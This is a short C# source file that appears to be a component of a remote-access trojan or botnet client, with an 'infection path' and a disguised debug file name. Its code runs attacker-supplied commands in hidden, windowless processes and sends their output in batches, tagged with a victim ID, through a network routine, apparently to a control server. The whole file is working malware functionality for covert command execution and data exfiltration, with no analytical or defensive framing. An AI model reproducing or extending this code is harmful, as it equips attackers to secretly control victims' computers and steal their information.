using System;
using System.Diagnostics;

namespace flu;

internal class Console
{
	private static Process cmd;

	public static void ExecuteAndSend(string command, string parameters, string uniqueID)
	{
		string text = OS.InfectionPath() + "\\_debug_err_win_32.txt";
		if (parameters == "cat _debug_err_win_32.txt")
		{
			parameters = "cat " + text;
		}
		parameters = parameters.Replace("\\", "\\\\");
		Execute(command, parameters);
		int num = 0;
		string text2 = "";
		string text3;
		while ((text3 = cmd.StandardOutput.ReadLine()) != null)
		{
			if (++num % 50 == 0)
			{
				text2 = text2 + text3 + "<br/>";
				Network.SendInformation(text2, command, uniqueID, 0);
				text2 = "";
			}
			else
			{
				text2 = text2 + text3 + "<br/>";
			}
		}
		Network.SendInformation(text2, command, uniqueID, 1);
	}

	public static void Execute(string command, string parameters)
	{
		cmd = new Process();
		cmd.EnableRaisingEvents = true;
		cmd.Exited += cmd_Exited;
		cmd.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		cmd.StartInfo.CreateNoWindow = true;
		cmd.StartInfo.RedirectStandardOutput = true;
		cmd.StartInfo.RedirectStandardInput = false;
		cmd.StartInfo.UseShellExecute = false;
		cmd.StartInfo.FileName = command;
		cmd.StartInfo.Arguments = parameters;
		cmd.Start();
	}

	private static void cmd_Exited(object sender, EventArgs e)
	{
	}
}
